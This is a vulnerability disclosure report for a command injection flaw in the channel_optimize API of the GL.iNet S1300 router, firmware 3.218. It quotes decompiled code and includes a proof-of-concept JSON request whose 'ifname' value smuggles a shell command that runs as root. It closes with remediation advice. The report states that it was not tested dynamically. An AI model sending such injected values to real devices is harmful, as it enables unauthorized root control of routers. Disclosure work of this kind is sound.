# GL.iNet S1300 3.218 was discovered to contain an authenticated command injection vulnerability in channel_optimize

## Overview

- Vendor: GL.iNet
- Product: S1300 (QSDK, ARM32)
- Version: 3.218
- Component: /www/cgi-bin/api, /ap/channel_optimize
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.2 High `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (administrator token required; the injected command runs as root)
- Manufacturer: https://www.gl-inet.com/

## Affected version

- `qsdk-s1300-3.218-0726-1721958248.img`.
- SquashFS/xz at `0x3C137C`.
- `/www/cgi-bin/api`.
- `/usr/lib/gl/libglutil.so`.

## Vulnerability details

`POST /api/ap/channel_optimize` is handled by `sub_3D538`. It reads
`device` and `ifname` from the JSON body and, for the S1300 model, calls
`get_optimal_channel_by_ifname_for_ipq40xx_private(ifname)`.

That helper builds shell commands with the caller-controlled `ifname`
and calls `system()`:

```c
sprintf(s, "iwpriv %s acsreport 1", ifname);
system(s);
sprintf(s, "wifitool %s acsreport | ...", ifname);
...
sprintf(s, "iwinfo %s fr | ...", ifname);
```

There is no validation, quoting, or metacharacter filtering on
`ifname`. A value such as:

```text
wlan0;id>/tmp/ch_pwn;#
```

produces:

```sh
iwpriv wlan0;id>/tmp/ch_pwn;# acsreport 1
```

The `iwpriv` command may fail for an invalid interface, but the injected
`id` already runs. The helper waits for `iwinfo_backend(ifname)` to
settle (up to about 30 seconds) before the first `system()` when the
name is not a real interface, so the request may take that long; a
valid interface name can be used before the injected separator.

The helper also uses `sprintf` into 512-byte stack buffers (`s[512]`,
`v20[512]`) without a length check, so an oversized `ifname` is
additionally a stack-buffer-overflow/DoS candidate.

## PoC

```http
POST /api/ap/channel_optimize HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid admin token>

{"device":"wlan0","ifname":"wlan0;id>/tmp/ch_pwn;#"}
```

After the request (allow for the helper's retry delay):

```sh
cat /tmp/ch_pwn
```

The marker contains the output of `id` in the web/API process context.

## Verification

The vulnerable handler in the stock `/www/cgi-bin/api, /ap/channel_optimize` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An authenticated administrator (or anyone with a stolen admin token)
can execute arbitrary commands as root through a channel-optimization
request. The same helper's unbounded `sprintf` gives a stack
memory-corruption/DoS path with a very long `ifname`.

## Remediation / known-CVE relation

- Do not interpolate `ifname` into shell commands. Use an argv-based
  executor (`iwpriv`/`wifitool` with separate arguments) and resolve
  `ifname` against the interface allow-list before any command.
- Bound `ifname` and reject quotes, `;`, `|`, `$`, backticks, newline and
  whitespace.
- NVD keyword searches for `GL.iNet channel_optimize`,
  `iwpriv acsreport`, and `GL.iNet ifname command injection` returned
  zero results on 2026-11-08. The separate firewall `dest_port` issue is
  CVE-2026-19982 (known, different handler). Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
GL.iNet

### Product
S1300 (QSDK, ARM32)

### Version or Commit
3.218

### Vulnerability Class
CWE-78 command injection

### CVE_status
CVE application in progress

### Description
POST /api/ap/channel_optimize passes the ifname field to libglutil's sprintf("iwpriv %s acsreport 1") followed by system(); ifname is not validated or quoted.

### Affected_component
/www/cgi-bin/api, /ap/channel_optimize

### Attack_vector
Authenticated JSON POST to /api/ap/channel_optimize with a crafted ifname.

### Product_version
S1300 (QSDK, ARM32) 3.218

### Reference
- https://www.gl-inet.com/
- https://github.com/vuln-1/vuln/blob/main/GL.iNet/S1300_V3.218/report-1.md
```
